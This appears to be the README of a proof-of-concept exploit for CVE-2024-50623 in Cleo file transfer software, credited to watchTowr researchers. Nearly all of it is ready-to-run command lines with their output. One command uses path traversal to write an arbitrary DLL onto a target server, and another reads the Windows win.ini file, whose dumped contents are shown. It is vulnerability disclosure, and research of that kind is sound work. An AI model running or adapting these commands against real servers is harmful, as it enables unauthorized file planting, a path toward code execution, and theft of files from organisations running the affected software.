# CVE-2024-50623
Cleo Unrestricted file upload and download PoC (CVE-2024-50623)


#### Arbitrary File Write

```
python CVE-2024-50623.py --target http://192.168.1.18:5080/Synchronization --action write --what poc.dll --where "..\..\..\..\poc.dll"
                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        CVE-2024-50623.py
        (*) Cleo Unrestricted file upload and download vulnerability (CVE-2024-50623)

          - Sonny and Sina Kheirkhah (@SinSinology) of watchTowr (sina@watchTowr.com)

        CVEs: [CVE-2024-50623]
[INFO] File written successfully

```

#### Arbitrary File Read

```
python CVE-2024-50623.py --target http://192.168.1.18:5080/Synchronization --action read --what CVE-2024-50623.py --where "..\..\windows\win.ini"
                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        CVE-2024-50623.py
        (*) Cleo Unrestricted file upload and download vulnerability (CVE-2024-50623)

          - Sonny and Sina Kheirkhah (@SinSinology) of watchTowr (sina@watchTowr.com)

        CVEs: [CVE-2024-50623]
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

# Exploit authors

This exploit was written by Sonny and Sina Kheirkhah (@SinSinology) of [watchTowr (@watchtowrcyber)](https://twitter.com/watchtowrcyber) 


# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://x.com/watchtowrcyber

